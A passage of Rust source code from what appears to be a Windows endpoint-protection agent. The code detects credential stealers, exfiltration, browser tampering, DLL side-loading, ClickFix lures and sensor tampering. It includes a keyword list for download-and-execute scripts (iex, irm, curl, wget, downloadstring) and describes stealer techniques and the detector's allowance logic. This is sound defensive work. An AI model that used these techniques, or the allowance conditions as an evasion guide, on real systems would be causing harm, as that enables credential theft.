                describe(&rp)
            ),
        );
        // Owner's PC 2026-10-22: the send came from the reader's *parent*
        // and that parent is the same vendor's signed Program Files backend.
        let vendor_backend = sender_is_parent
            && crate::legit_apps::vendor_backend(proc_, &rp, self.system_drive, sender_tainted);
        hit.actions.push(kill(&rp, true));
        if rg != proc_.guid && !vendor_backend && !bits && !sender_trusted {
            hit.actions.push(kill(proc_, true));
            if proc_.path_class.is_user_writable() {
                hit.actions.push(quarantine(proc_));
            }
        }
        if !vendor_backend {
            // Block scope: a validly signed sender installed under Program
            // Files gets a per-image block; the BITS service and anything
            // else a host-wide block.
            let scope = (!bits
                && proc_.signed == SignatureState::Valid
                && crate::legit_apps::in_program_files(&proc_.image, self.system_drive))
            .then(|| proc_.image.clone());
            hit.actions.push(ResponseAction::BlockDestination {
                ip: ip_norm.clone(),
                port: None,
                image: scope.clone(),
                ttl_secs: Some(BLOCK_TTL_SECS),
                ioc_id: None,
            });
            hit.escalation_ip = Some((ip_norm, dst_port, scope));
        } else {
            hit.summary.push_str(&format!(
                " (the connection came from {}, the reader's parent, signed by the same vendor and installed under Program Files: only the reader is stopped, the parent and the destination are left alone)",
                short_name(proc_)
            ));
        }
        hit.actions.push(quarantine(&rp));

        // Destination class (fix round 2026-10-25): an allowance for benign
        // reads never covers a raw IP (no DNS name) or a dead-drop /
        // exfiltration service.
        let host_l = host.as_deref().map(|h| h.trim_end_matches('.').to_string());
        let raw = host_l.is_none();
        let exfil = host_l
            .as_deref()
            .is_some_and(|h| self.exfil_match(h).is_some() && !self.domain_owner_ok(proc_, h));
        let rg_tainted = self.tainted(&rg);
        let ms_senders_ok = crate::legit_apps::microsoft_sender_ok(proc_, sender_tainted)
            && crate::legit_apps::microsoft_sender_ok(&rp, rg_tainted);
        let benign_verdict: Option<(Severity, String)> = match self.states.get(&rg) {
            Some(s)
                if (s.wam_cred
                    || s.own_app_dpapi
                    || s.dev_tool_cred
                    || s.ms_wam_cred
                    || s.vendor_cfg_cred
                    || s.own_folder_cred)
                    && !s.non_wam_cred
                    && !exfil =>
            {
                let h = host_l.clone().unwrap_or_default();
                let mut worst = Severity::Low;
                let mut notes: Vec<String> = Vec::new();
                let mut full = false;
                if raw && (s.wam_cred || s.dev_tool_cred || s.vendor_cfg_cred) {
                    // No DNS name for the destination (DoH, a reused
                    // connection, or a hard-coded address): never Low.
                    worst = Severity::High;
                    notes.push(format!(
                        "the destination {ip_s} has no DNS name Kestrel saw; review"
                    ));
                }
                if s.ms_wam_cred {
                    if ms_senders_ok
                        && (crate::legit_apps::microsoft_endpoint(&h)
                            || crate::legit_apps::github_signin_host(&h)
                            || crate::legit_apps::github_copilot_host(&h))
                    {
                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app and the connection went to its own sign-in endpoint {h}"));
                    } else if ms_senders_ok && crate::legit_apps::extension_telemetry_host(&h) {
                        // Owner export 2026-10-25: VS Code extensions post
                        // telemetry to Azure Application Insights; anyone can
                        // own an ingestion key there, so never Low.
                        worst = worst.max(Severity::High);
                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app, then it posted to the telemetry ingestion service {h} (shared by extension telemetry and any Application Insights owner); review"));
                    } else if ms_senders_ok && h.eq_ignore_ascii_case("api.github.com") {
                        // FP-03: VS Code's GitHub sign-in calls the API too;
                        // the API can also create gists, so never Low.
                        worst = worst.max(Severity::High);
                        notes.push("the Windows sign-in (WAM) token cache was read by a Microsoft-signed app, then it called api.github.com (GitHub sign-in uses it, and so can a gist upload); review".to_string());
                    } else {
                        full = true;
                    }
                }
                if s.wam_cred && !raw {
                    if crate::legit_apps::microsoft_first_party(&h) {
                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed Program Files app and the connection went to the Microsoft service {h}"));
                    } else {
                        worst = worst.max(Severity::High);
                        notes.push(format!("the Windows sign-in (WAM) token cache was read by a Microsoft-signed Program Files app, but {h} is not a Microsoft service; review"));
                    }
                }
                if s.dev_tool_cred && !raw {
                    let provider_ep = s
                        .cloud_provider
                        .is_some_and(|p| crate::legit_apps::provider_endpoint(p, &h));
                    let own_ep = crate::legit_apps::dev_tool_endpoint(rp.signer.as_deref(), &h)
                        || (vendor_backend
                            && crate::legit_apps::dev_tool_endpoint(proc_.signer.as_deref(), &h));
                    if own_ep || provider_ep {
                        notes.push(format!("only developer-tool credential stores were read, by their own publisher's signed tool, and the connection went to that publisher's or provider's endpoint {h}"));
                    } else {
                        worst = worst.max(Severity::High);
                        notes.push(format!("only developer-tool credential stores were read, by their own publisher's signed tool, but {h} is not that publisher's or the provider's endpoint (a private registry or API server, or theft); review"));
                    }
                }
                if s.vendor_cfg_cred {
                    let vendor_send = rg == proc_.guid || vendor_backend;
                    if !vendor_send {
                        worst = worst.max(Severity::High);
                    }
                    notes.push(
                        "Steam's client configuration was read by a signed vendor service"
                            .to_string(),
                    );
                }
                if s.own_app_dpapi {
                    notes.push("the app's own Electron safeStorage key was decrypted".to_string());
                }
                if s.own_folder_cred {
                    if raw {
                        full = true;
                    } else {
                        worst = worst.max(Severity::High);
                        notes.push(format!("an app whose signer Kestrel cannot verify read the store in its own folder, then connected to {h}; review"));
                    }
                }
                (!full).then(|| (worst, notes.join("; ")))
            }
            _ => None,
        };
        if let Some((sev, note)) = benign_verdict {
            // Triage item 5 / review H4 / fix round 2026-10-25: benign reads
            // to their own endpoints are Low Audit; to another named host
            // High Audit; a raw IP or an exfiltration service never gets here.
            hit.mode_override = Some(RuleMode::Audit);
            hit.strong = false;
            hit.severity = sev;
            hit.summary.push_str(&format!(" ({note}; alert only)"));
            // Own dedup key: a later full ST-04 of the same process (another
            // destination) is a visible alert, not a silent re-hit action.
            hit.dedup_key = Some(format!("{ST04}#benign"));
        } else if let Some((provider, h)) =
            self.provider_destination(&rg, &rp, proc_, host.as_deref())
        {
            // 2026-10-22: one provider's stores, its own endpoint, signed
            // processes: SDK / CLI use. High Audit, no kill or block.
            hit.actions.clear();
            hit.escalation_ip = None;
            hit.mode_override = Some(RuleMode::Audit);
            hit.strong = false;
            hit.severity = Severity::High;
            hit.dedup_key = Some(format!("{ST04}#provider"));
            hit.summary = format!(
                "{} read {phrase}, {who} {provider} ({h}) {delay} later; this is normal for SDK / CLI use but would also fit an attacker using the credentials; review",
                describe(&rp)
            );
        } else if self
            .states
            .get(&rg)
            .is_some_and(|s| s.dpapi_chromium && !s.dpapi_named && !s.file_cred)
            && !self.tree_keys(&rg).iter().any(|k| {
                self.tree
                    .get(k)
                    .is_some_and(|c| c.members.iter().any(|m| m != &rg))
            })
        {
            // Xeno (DETECTION-QUALITY.md section 5): the only secret is a
            // DPAPI unprotect described "Chromium" (Electron's generic key
            // description) and neither the reader nor its tree opened any
            // credential store: a stealer must read the store whose key it
            // decrypts, and that read gets the full response. High Audit, no
            // containment, own dedup key (a later store read + send is not
            // swallowed by this alert).
            hit.mode_override = Some(RuleMode::Audit);
            hit.strong = false;
            hit.severity = Severity::High;
            hit.actions.clear();
            hit.escalation_ip = None;
            hit.dedup_key = Some(format!("{ST04}#chromium-key"));
            hit.summary.push_str(" (the only secret was a DPAPI key described \"Chromium\", the generic description of Electron apps' own key, and no credential store was opened by the process or its tree; review)");
        }
        hit.process = Some(rp);
        if rg != proc_.guid {
            hit.extra_evidence.push(e.clone());
        } else {
            self.state(&rg, e.ts).add_evidence(e);
        }
        self.emit(e, hit);
    }

    /// ST-04 provider-destination allowance (2026-10-22): every credential
    /// read of `rg` was a developer-tool store of one cloud provider, `host`
    /// (the correlated DNS name of the connection; `None` = no allowance) is
    /// one of that provider's service endpoints, and both the reader and the
    /// sender are validly signed, outside Temp / Downloads / external media
    /// and not tampered. Returns (provider, host).
    fn provider_destination(
        &mut self,
        rg: &ProcessGuid,
        reader: &ProcessInfo,
        sender: &ProcessInfo,
        host: Option<&str>,
    ) -> Option<(&'static str, String)> {
        let h = host?;
        let s = self.states.get(rg)?;
        if s.non_provider_cred {
            return None;
        }
        let provider = s.cloud_provider?;
        // Fix round 2026-10-25 (corpus `script_shai_hulud_aws_secrets_manager`):
        // never for package-manager install scripts, and never for a sweep
        // (three or more distinct service hosts of the provider: regions /
        // services enumerated with the stolen keys).
        if self.package_install_tree(reader) || self.package_install_tree(sender) {
            return None;
        }
        if crate::legit_apps::provider_endpoint(provider, h) {
            let hl = h.trim().trim_end_matches('.').to_ascii_lowercase();
            let st = self.state(rg, reader.start_ts.max(0));
            if !st.provider_hosts.contains(&hl) && st.provider_hosts.len() < 16 {
                st.provider_hosts.push(hl);
            }
            if st.provider_hosts.len() >= 3 {
                return None;
            }
        }
        (crate::legit_apps::provider_endpoint(provider, h)
            && crate::legit_apps::provider_allowance_ok(
                reader,
                self.tampered.contains(&reader.guid),
            )
            && crate::legit_apps::provider_allowance_ok(
                sender,
                self.tampered.contains(&sender.guid),
            ))
        .then(|| {
            (
                provider,
                h.trim().trim_end_matches('.').to_ascii_lowercase(),
            )
        })
    }

    fn on_dns(&mut self, e: &Event, qname: &str, answers: &[String]) {
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let q = qname.trim_end_matches('.').to_ascii_lowercase();
        let ips: Vec<String> = answers
            .iter()
            .filter_map(|a| parse_ip(a))
            .map(|i| i.to_string())
            .collect();
        {
            let st = self.state(&e.guid, e.ts);
            for ip in &ips {
                if st.dns.len() >= MAX_DNS_PER_PROC && !st.dns.contains_key(ip) {
                    if let Some(k) = st.dns.keys().next().cloned() {
                        st.dns.remove(&k);
                    }
                }
                st.dns.insert(ip.clone(), q.clone());
            }
        }
        let proc_ = self.proc_info(e);
        let browser =
            identity::genuine_browser(&proc_, self.system_drive, self.tainted(&proc_.guid));
        if let Some(h) = self.iocs.by_domain(&q).cloned() {
            if h.action == IocAction::Allow {
                return;
            }
            let mut actions: Vec<ResponseAction> = ips
                .iter()
                .map(|ip| self.ioc_block(ip, &proc_, &h.id))
                .collect();
            if !browser {
                actions.push(kill(&proc_, true));
            }
            self.emit_ioc(
                e,
                &proc_,
                IOC_DNS,
                &h,
                format!("{} looked up known-bad domain {q}", describe(&proc_)),
                actions,
            );
        }
        if browser {
            return;
        }
        if self.exfil_match(&q).is_some() && !self.domain_owner_ok(&proc_, &q) {
            let mut hit = Hit::new(ST14, &proc_.guid, Severity::High, format!("{} looked up {q} — a dead-drop / exfiltration service stealers use for C2 and uploads", describe(&proc_)));
            if crate::legit_apps::wsl_dns_proxy(&proc_, self.system_drive) {
                Self::st14_wsl(&mut hit, &proc_, "looked up", &q);
            } else {
                hit.actions = Self::st14_actions(&proc_, &ips, None);
            }
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // cross-process access (ST-07, ST-08 attribution)
    // ------------------------------------------------------------------

    fn on_target(&mut self, e: &Event, t: &TargetProcess) {
        let browser_target = is_browser_image(&t.target_image);
        // Re-review N6: password managers in the importer table are tracked
        // for tampering too (ST-16), though ST-07 itself is browser-only.
        // Owner's PC 2026-10-22: any Program Files image is tracked too, so
        // an injected developer tool / vendor backend never counts as
        // `legit_apps::dev_tool_reader` / `vendor_backend`.
        let known_target = browser_target
            || crate::legit_apps::app_at_location(&t.target_image, self.system_drive).is_some()
            || crate::legit_apps::in_program_files(&t.target_image, self.system_drive);
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let src = self.proc_info(e);
        let src_tainted = self.tainted(&src.guid);
        // Fix round 2026-10-25 (corpus finding 1, taint): any process that
        // receives a remote thread, a thread-context change or a debugger,
        // or a write / create-thread handle (VM_WRITE 0x20, CREATE_THREAD
        // 0x2) from an untrusted or itself tainted actor, is tainted: it
        // loses every allowance and owner status, Windows binaries included
        // (credwiz, OpenWith, explorer, dllhost hosting a stealer). Not from
        // an unknown actor (no image), not the process itself, not an app
        // opening the WebView2 it hosts, not a benign security product.
        {
            let target_guid = t
                .target_guid
                .clone()
                .or_else(|| self.table.by_pid(t.target_pid).map(|p| p.guid.clone()));
            let untrusted_src = (Self::untrusted_actor(&src) || src_tainted)
                && !src.image.is_empty()
                && !Self::is_benign_av(&src);
            let taint = match &e.data {
                EventData::RemoteThread(_)
                | EventData::ThreadContext(_)
                | EventData::DebugAttach(_) => {
                    !self.protected(&src)
                        && !Self::is_benign_av(&src)
                        && (known_target || untrusted_src)
                }
                EventData::ProcessAccess(_) => {
                    let mask = if known_target {
                        0x2 | 0x8 | 0x20
                    } else {
                        0x2 | 0x20
                    };
                    t.granted_access & mask != 0
                        // A refused open (LSA protection, anti-cheat probes)
                        // wrote nothing.
                        && t.return_code == 0
                        && untrusted_src
                        && !(file_name_lower(&t.target_image) == "msedgewebview2.exe"
                            && self.hosts_webview(&src, t))
                }
                _ => false,
            };
            if let Some(g) = target_guid.filter(|g| taint && *g != src.guid) {
                self.taint(g);
            }
        }
        if !known_target {
            return;
        }
        if identity::genuine_browser(&src, self.system_drive, src_tainted) {
            return; // browser broker / children
        }
        if let EventData::ProcessAccess(_) = &e.data {
            if browser_target && t.is_termination() && !self.protected(&src) {
                self.kill_intents.push_back((e.ts, src.guid.clone()));
                if self.kill_intents.len() > 256 {
                    self.kill_intents.pop_front();
                }
            }
        }
        // ST-07 actor: untrusted, or itself tampered with (corpus
        // `stealer_deerstealer_xfiles`: a validly signed host in ProgramData
        // that a side-loaded DLL process injected into).
        if !browser_target
            || !(Self::untrusted_actor(&src) || src_tainted)
            || Self::is_benign_av(&src)
        {
            return;
        }
        let tname = crate::paths::file_name(&t.target_image).to_string();
        let what = match &e.data {
            EventData::ProcessAccess(_) => {
                if t.granted_access & (0x2 | 0x10 | 0x20) == 0 {
                    return;
                }
                format!("opened {tname} (pid {}) with memory {}", t.target_pid, access_rights(t.granted_access))
            }
            EventData::RemoteThread(_) => format!("injected a thread into {tname} (pid {})", t.target_pid),
            EventData::ThreadContext(_) => format!("changed a thread context in {tname} (pid {}) — hardware-breakpoint key capture", t.target_pid),
            EventData::DebugAttach(_) => format!("attached a debugger to {tname} (pid {}) — the VoidStealer way to capture the App-Bound key", t.target_pid),
            _ => return,
        };
        // Soak 2026-10-21 (narrowed after re-review N1): Windows Installer's
        // Restart Manager files-in-use check opens running processes with
        // exactly QUERY_INFORMATION | VM_READ | TERMINATE (0x411) or the
        // limited-information variants. Only the msiserver **service
        // instance** — Microsoft-signed System32 `msiexec.exe /V`, SYSTEM,
        // started by System32 `services.exe` — is exempt, and only for those
        // masks. Client-side msiexec, `msiexec /y|/z <dll>`, custom-action
        // servers and anything else keep the full response.
        if let EventData::ProcessAccess(_) = &e.data {
            if RM_ACCESS_MASKS.contains(&t.granted_access) && self.is_msiserver(&src) {
                return;
            }
        }
        // Triage 2026-10-22 item 7: an app opening the WebView2 process it
        // hosts (WhatsApp, Teams, Outlook, Widgets) is hosting, not browser
        // tampering.
        if matches!(e.data, EventData::ProcessAccess(_)) && self.hosts_webview(&src, t) {
            return;
        }
        let mut hit = Hit::new(
            ST07,
            &src.guid,
            Severity::Critical,
            format!("{} {what}", describe(&src)),
        );
        hit.actions.push(kill(&src, true));
        hit.actions.push(quarantine(&src));
        self.state(&src.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    /// Triage 2026-10-22 item 7 (`WhatsApp.Root.exe` opened
    /// `msedgewebview2.exe` with 0x1f0fff): the target is a WebView2 process
    /// (`msedgewebview2.exe`) that `src` hosts: its parent in the process
    /// table is `src`, or it carries `--webview-exe-name=<src image name>`
    /// (WebView2 renderers and utilities, whose parent is the WebView2
    /// browser process). Never when `src` is a LOLBin / script host, when
    /// the WebView2 runs under remote control, or when its
    /// `--user-data-dir` is a real browser profile (Edge, Chrome, ...).
    /// Real browsers (msedge, chrome, brave, firefox) and a WebView2 opened
    /// by an unrelated process keep ST-07.
    fn hosts_webview(&self, src: &ProcessInfo, t: &TargetProcess) -> bool {
        if !crate::paths::file_name(&t.target_image).eq_ignore_ascii_case("msedgewebview2.exe") {
            return false;
        }
        // Review H3: the host is an installed application (Program Files /
        // WindowsApps on the system volume, admin-only), not an unsigned
        // tool in a user folder that launched a WebView2 of its own, and
        // was never injected into.
        let src_name = file_name_lower(&src.image);
        if src_name.is_empty()
            || crate::legit_apps::is_interpreter(&src_name)
            || !crate::legit_apps::in_program_files(&src.image, self.system_drive)
            || self.tampered.contains(&src.guid)
        {
            return false;
        }
        // FP-05 (fix round 2026-10-25): an MSIX app (image in its own
        // WindowsApps package folder, TrustedInstaller-only; the package
        // signature is verified at install, files often carry no Authenticode
        // of their own) hosting WebView2. WhatsApp's background
        // `WhatsApp.Root.exe` opens the WebView2 processes of its sibling
        // `WhatsApp.exe`. An invalid signature never qualifies.
        let src_family = crate::paths::msix_package_family(&src.image, self.system_drive)
            .filter(|_| src.signed != SignatureState::Invalid);
        let tp = t
            .target_guid
            .as_ref()
            .and_then(|g| self.table.get(g))
            .or_else(|| self.table.by_pid(t.target_pid));
        let Some(tp) = tp else {
            // The WebView2 predates the agent: only a packaged host's open of
            // a WebView2 from the Edge WebView install tree.
            return src_family.is_some()
                && crate::legit_apps::program_files_rest(&t.target_image, self.system_drive)
                    .is_some_and(|r| r.starts_with(r"\microsoft\edgewebview\application\"));
        };
        if !file_name_lower(&tp.image).eq("msedgewebview2.exe")
            || crate::legit_apps::is_remote_controlled(&tp.cmdline)
        {
            return false;
        }
        // Chromium honours the last `--user-data-dir`; an 8.3 short name
        // could hide a real browser profile.
        let sw = crate::legit_apps::switches(&tp.cmdline);
        if let Some(udd) = sw
            .iter()
            .rev()
            .find(|(k, _)| k == "user-data-dir")
            .and_then(|(_, v)| v.as_deref())
        {
            if udd.contains('~') {
                return false;
            }
            let ls = normalize_path(&format!(
                "{}\\Local State",
                udd.trim().trim_end_matches('\\')
            ));
            if match_normalized(&ls).is_some_and(|s| s.app != "Chromium-based browser") {
                return false;
            }
        }
        // The opener launched it: it is the WebView2's parent, or (renderers,
        // GPU / utility processes) its grandparent through the WebView2
        // browser process. A name on the command line alone is not enough.
        let mut cur = self.table.parent_of(tp);
        for _ in 0..3 {
            let Some(pp) = cur else { break };
            if pp.guid == src.guid {
                return true;
            }
            // FP-05: launched by another process of the opener's own package.
            if src_family.is_some()
                && crate::paths::msix_package_family(&pp.image, self.system_drive) == src_family
            {
                return true;
            }
            if !file_name_lower(&pp.image).eq("msedgewebview2.exe") {
                break;
            }
            cur = self.table.parent_of(pp);
        }
        // The WebView2's launcher is gone (or predates the agent): a packaged
        // host and a WebView2 from the Edge WebView install tree.
        cur.is_none()
            && src_family.is_some()
            && crate::legit_apps::program_files_rest(&tp.image, self.system_drive)
                .is_some_and(|r| r.starts_with(r"\microsoft\edgewebview\application\"))
    }

    // ------------------------------------------------------------------
    // image loads (ST-08b, ST-09, ST-15)
    // ------------------------------------------------------------------

    fn on_image_load(
        &mut self,
        e: &Event,
        path: &str,
        _signer: Option<&str>,
        signed: SignatureState,
    ) {
        let dll = file_name_lower(path);
        let is_nss = dll == "nss3.dll";
        let is_sideload = SIDELOAD_DLLS.contains(&dll.as_str());
        let bad_sig = matches!(signed, SignatureState::Unsigned | SignatureState::Invalid);
        let maybe_sideload = signed == SignatureState::Unknown
            && (SIDELOAD_SYSTEM_DLLS.contains(&dll.as_str())
                || CHROMIUM_CORE_DLLS.contains(&dll.as_str()));
        if !is_nss && !is_sideload && !bad_sig && !maybe_sideload {
            return;
        }
        if self.is_agent_owned(&e.guid) || e.pid == 0 || e.pid == 4 {
            return;
        }
        let proc_ = self.proc_info(e);
        // Fix round 2026-10-25 (taint by side-loading; corpus
        // `evasion_chrome_copy_sideload`, `evasion_keepass_named_benign_reader`,
        // `evasion_office_xll_wam_raw_ip`, `stealer_deerstealer_xfiles`): a
        // validly signed process that loads an unsigned / invalidly signed
        // module from a user-writable or unclassified folder (not its own
        // image) is no longer the application it was signed as.
        // Red-team round 2: the sensor's first load of a freshly dropped DLL
        // can carry `unknown` (non-blocking enrichment). An unknown module
        // with a classic side-load name (a Windows DLL a program loads from
        // its own folder first) or a Chromium core DLL outside its version
        // folder taints too.
        let unknown_sideload = signed == SignatureState::Unknown
            && (SIDELOAD_SYSTEM_DLLS.contains(&dll.as_str())
                || (CHROMIUM_CORE_DLLS.contains(&dll.as_str()) && !in_version_dir(path)));
        if (bad_sig || unknown_sideload)
            && proc_.signed == SignatureState::Valid
            && crate::table::image_key(path) != crate::table::image_key(&proc_.image)
            && !matches!(
                path_class_of(path, self.system_drive),
                PathClass::System | PathClass::Windows | PathClass::ProgramFiles
            )
        {
            self.taint(proc_.guid.clone());
        }
        let pname = file_name_lower(&proc_.image);
        let dll_dl = driveless(path);

        if is_nss && !is_mozilla_image(&proc_.image) && !NSS_BUNDLERS.contains(&pname.as_str()) {
            let same_dir = !proc_.image.is_empty()
                && dll_dl.rsplit_once('\\').map(|d| d.0)
                    == driveless(&proc_.image).rsplit_once('\\').map(|d| d.0);
            if !same_dir || is_untrusted_location_or_signature(&proc_) {
                let hit = Hit::new(ST09, &proc_.guid, Severity::Medium, format!("{} loaded Firefox's crypto library nss3.dll from {} — used to decrypt saved Firefox passwords", describe(&proc_), truncate(path, 120)));
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if is_sideload && SIDELOAD_HOSTS.contains(&pname.as_str()) && !proc_.image.is_empty() {
            let pdl = driveless(&proc_.image);
            let host_legit = SIDELOAD_LEGIT_DIRS.iter().any(|d| pdl.contains(d));
            let dll_legit = SIDELOAD_LEGIT_DIRS.iter().any(|d| dll_dl.contains(d));
            if !host_legit && !dll_legit {
                let mut hit = Hit::new(ST15, &proc_.guid, Severity::High, format!("{} — a Microsoft component running outside its install folder — loaded {} from {} (DLL side-loading)", describe(&proc_), crate::paths::file_name(path), truncate(path, 120)));
                hit.actions.push(kill(&proc_, true));
                hit.actions.push(ResponseAction::QuarantineFile {
                    path: path.to_string(),
                    sha256: None,
                });
                hit.actions.push(quarantine(&proc_));
                self.state(&proc_.guid, e.ts).add_evidence(e);
                self.emit(e, hit);
            }
        }

        if bad_sig && BROWSER_APP_DIRS.iter().any(|d| dll_dl.contains(d)) {
            let mut hit = Hit::new(ST08, &proc_.guid, Severity::High, format!("{} loaded unsigned {} from the browser's Application folder — code there can ask the elevation service to decrypt cookies", describe(&proc_), crate::paths::file_name(path)));
            if !is_browser_image(&proc_.image) {
                hit.actions.push(kill(&proc_, false));
            }
            hit.actions.push(ResponseAction::QuarantineFile {
                path: path.to_string(),
                sha256: None,
            });
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    // ------------------------------------------------------------------
    // registry (ST-10, TP-01/03/04)
    // ------------------------------------------------------------------

    fn on_registry(&mut self, e: &Event, key: &str, value_name: &str, data: Option<&str>) {
        let k = key.to_ascii_lowercase();
        let vn = value_name.to_ascii_lowercase();
        let d = data.unwrap_or("").to_ascii_lowercase();
        // V-H6/H7: only an *exactly* attributed agent write is the agent's
        // own; a correlation guess or an unattributed change is still judged.
        let attr = crate::families::attribution_of(e);
        if attr == Attribution::Exact && self.is_agent_guid(&e.guid) {
            return;
        }
        // ST-10 ClickFix RunMRU / TypedPaths
        let runmru = k.contains(r"\explorer\runmru");
        let typed = k.contains(r"\explorer\typedpaths");
        // ST-10 always alerts; killing the writer's children needs the exact
        // writer (NEW-2: Explorer's RunMRU writes are rarely `Exact`).
        if (runmru || typed) && vn != "mrulist" {
            if let Some(bin) = runmru_lolbin(&d) {
                self.on_clickfix_artifact(e, bin, runmru, data.unwrap_or(""), attr);
            }
        }
        // Tamper via registry
        let tp = if k.contains(r"\control\wmi\autologger\")
            && matches!(vn.as_str(), "start" | "enabled" | "enableproperty")
            && crate::util::reg_number(&d) == Some(0)
        {
            Some((TP01, "disabled an ETW AutoLogger session or provider"))
        } else if (k.contains(r"\software\microsoft\amsi")
            && (vn == "featurebits" || k.contains(r"\providers")))
            || k.contains(r"\microsoft\amsi\providers\")
        {
            Some((TP03, "changed the AMSI configuration"))
        } else if is_kestrel_service_key(&k) {
            Some((TP04, "modified the Kestrel service configuration"))
        } else {
            None
        };
        if let Some((rule, what)) = tp {
            let proc_ = self.proc_info(e);
            let mut hit = Hit::new(
                rule,
                &proc_.guid,
                Severity::Critical,
                format!(
                    "{} {what} ({}\\{value_name} = {})",
                    describe(&proc_),
                    truncate(key, 100),
                    truncate(data.unwrap_or(""), 40)
                ),
            );
            if attr != Attribution::Exact {
                // Writer guessed or unknown: still report the tamper (even
                // with a pid-0 / agent subject), never act on the guess.
                hit.tamper = true;
                hit.remediation_only = true;
                hit.summary.push_str(if attr == Attribution::None {
                    " (writer unknown)"
                } else {
                    " (writer inferred by correlation)"
                });
            }
            self.state(&proc_.guid, e.ts).add_evidence(e);
            self.emit(e, hit);
        }
    }

    fn on_clickfix_artifact(
        &mut self,
        e: &Event,
        bin: &'static str,
        runmru: bool,
        raw: &str,
        attr: Attribution,
    ) {
        // A guess landing on the agent (or its children) means "unknown".
        let attr = if attr == Attribution::Heuristic && self.is_agent_owned(&e.guid) {
            Attribution::None
        } else {
            attr
        };
        let exact = attr == Attribution::Exact;
        let writer = if attr == Attribution::None {
            unknown_subject(e.ts, &changed_object(e))
        } else {
            self.proc_info(e)
        };
        let protect = self.mode(ST10) == RuleMode::Protect;
        // Only the exact writer's spawned chain is a kill target.
        let children: Vec<ProcessInfo> = if exact {
            self.table
                .children_of(&writer.guid)
                .into_iter()
                .filter(|c| {
                    c.exit_ts.is_none()
                        && (e.ts - c.start_ts).abs() <= CLICKFIX_WINDOW_MS
                        && file_name_lower(&c.image).starts_with(bin)
                })
                .cloned()
                .collect()
        } else {
            vec![]
        };
        let surface = if runmru {
            "the Run dialog (RunMRU)"
        } else {
            "the Explorer address bar (TypedPaths)"
        };
        let cmd = truncate(raw.trim_end_matches("\\1"), 160);
        let subject = children.first().cloned().unwrap_or_else(|| writer.clone());
        let mut hit = Hit::new(ST10, &subject.guid, Severity::High, format!("A command was pasted into {surface} and run: \"{cmd}\" — the hallmark of a ClickFix fake-CAPTCHA lure"));
        hit.process = Some(subject);
        for c in &children {
            hit.actions.push(kill(c, true));
        }
        hit.extra_evidence.push(e.clone());
        if !exact {
            // Alert only: no kills, no pending kill window for the guess.
            hit.remediation_only = true;
            hit.summary.push_str(if attr == Attribution::None {
                " (the writer could not be attributed; alert only)"
            } else {
                " (the writer was inferred by correlation; alert only)"
            });
            self.emit(e, hit);
            return;
        }
        if protect && self.clickfix.len() < 64 {
            self.clickfix.push(ClickfixPending {
                writer: writer.guid.clone(),
                until: e.ts + CLICKFIX_WINDOW_MS,
                lolbin: bin,
                protect,
            });
        }
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // script blocks (ST-11 script variant, IOC-URL)
    // ------------------------------------------------------------------

    fn on_script(&mut self, e: &Event, content: &str) {
        if self.is_agent_owned(&e.guid) {
            return;
        }
        let c = content.to_ascii_lowercase();
        let proc_ = self.proc_info(e);
        if let Some(h) = self.iocs.by_url_in(&c).cloned() {
            self.emit_ioc(
                e,
                &proc_,
                IOC_URL,
                &h,
                format!(
                    "{} ran a script containing the known-bad URL {}",
                    describe(&proc_),
                    h.value
                ),
                vec![kill(&proc_, true)],
            );
        }
        let exec =
            contains_word(&c, "iex") || c.contains("invoke-expression") || c.contains("| . (");
        let fetch = ["irm", "iwr", "curl", "wget"]
            .iter()
            .any(|w| contains_word(&c, w))
            || [
                "downloadstring",
                "downloaddata",
                "invoke-restmethod",
                "invoke-webrequest",
                "net.webclient",
                "frombase64string",
            ]
            .iter()
            .any(|w| c.contains(w));
        if !(exec && fetch) {
            return;
        }
        let Some(parent) = self.table.parent_of(&proc_).cloned() else {
            return;
        };
        let pn = file_name_lower(&parent.image);
        if !(pn == "explorer.exe"
            || matches!(
                pn.as_str(),
                "windowsterminal.exe" | "wt.exe" | "openconsole.exe"
            )
            || is_browser_image(&pn))
        {
            return;
        }
        let mut hit = Hit::new(ST11, &proc_.guid, Severity::High, format!("{} (started by {pn}) ran a download-and-execute script: \"{}\" — the pattern of a pasted ClickFix command", short_name(&proc_), truncate(content.trim(), 160)));
        hit.actions.push(kill(&proc_, true));
        self.state(&proc_.guid, e.ts).add_evidence(e);
        self.emit(e, hit);
    }

    // ------------------------------------------------------------------
    // tamper (TP-01…TP-05)
    // ------------------------------------------------------------------

    fn on_tamper(&mut self, e: &Event, kind: TamperKind, detail: &str) {
        let (rule, sev, what) = match kind {
            TamperKind::EtwSessionStopped => (
                TP01,
                Severity::Critical,
                "an ETW telemetry session was stopped",
            ),
            TamperKind::EtwProviderDisabled => {
                (TP01, Severity::Critical, "an ETW provider was disabled")
            }
            TamperKind::WfpFilterChange => (
                TP02,
                Severity::Critical,
                "Windows Filtering Platform filters affecting the agent changed",
            ),
            TamperKind::AmsiProviderChange => (
                TP03,
                Severity::Critical,
                "the AMSI provider configuration changed",
            ),
            TamperKind::ServiceConfigChange => (
                TP04,
                Severity::Critical,
                "the Kestrel service configuration changed",
            ),
            TamperKind::AgentFileModified => (
                TP04,
                Severity::Critical,
                "a Kestrel agent file was modified",
            ),
            TamperKind::UninstallAttempt => (
                TP04,
                Severity::Critical,
                "someone tried to uninstall the Kestrel agent",
            ),
            TamperKind::EventsLost => (TP05, Severity::High, "the agent lost telemetry events"),
        };
        let mut hit = Hit::new(
            rule,
            &e.guid,
            sev,
            format!(
                "Kestrel self-protection: {what}{}",
                if detail.is_empty() {
                    String::new()
                } else {
                    format!(" ({})", truncate(detail, 200))
                }
            ),
        );
        hit.tamper = true;
        if kind == TamperKind::WfpFilterChange && self.os_firewall_refresh(detail) {
            // FP-10 (fix round 2026-10-25): Windows Firewall / BFE replacing
